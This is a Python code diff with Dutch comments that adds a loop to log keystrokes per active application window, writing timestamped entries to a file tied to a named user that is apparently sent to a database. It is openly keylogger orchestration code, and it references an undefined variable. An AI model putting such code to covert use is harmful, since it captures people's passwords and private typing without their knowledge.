@@ -18,15 +18,28 @@ def main():
         # Code voor versturen van het bestand naar DB
         print("Bestand is verstuurd naar de database!")
     with open("keyboard_events.txt", 'w') as f:
-        # V Voeg gebruikerID toe aan bovenkant .txt file.
-        # 2. Controleer actieve applicatie, voeg toe aan .txt file
-        # 3. Start keylogger vanaf moment dat applicatie activeert.
-        # 4. Zodra andere applicatie activeert, stop vorige keylogger en start nieuwe.
-        # 5. Plaats log van vorige keylogger onder applicatieregel in .txt file.
-        f.write("Gebruiker: Keano S.")
+        last_active_window = None
+        f.write("Gebruiker: Keano S." + "\n")  # Keano vervangen met identificerende gebruiker
         f.write("======================================================" + "\n")
-        active_window, window_title = web_and_app_info_logger.active_window_grabber()
-        f.write(f"" + window_title)
+        keylogger = keystrokes_and_clipboard_logger.Keylogger()
+        while True:
+            active_window, active_window_title = web_and_app_info_logger.active_window_grabber()
+            if active_window != last_active_window and not keylogger.is_recording:
+                keylogger.start_keylogger_recording()
+                f.write(f"OPENED {active_window_title} ON {datetime.datetime.now()} \n")
+
+            elif active_window_title != last_window_title and keylogger.is_recording:
+                keylogger.stop_keylogger_recording()
+                relevant_keys = keylogger.get_down_keypressed()
+                f.write(f"{relevant_keys} \n")
+            last_active_window = active_window
+
+    # Begin van programma, maak txt file o.b.v. datum + tijdstip
+    # Zolang programma runned, controleer welke applicatie openstaat.
+    # Als nieuwe applicatie geopend, schrijf op nieuwe regel "OPENED {applicatienaam} met misschien tijd + datum erbij"
+    # Alle gelogde keys onder die regel ==> elk karakter nieuwe regel? Elk woord? 1 lange string?
+    # Als applicatie gesloten ==> noteer in tekstbestand met tijdstip? (Nodig?)
+    # Als applicatie niet gesloten ==> niks doen.
 
 
 
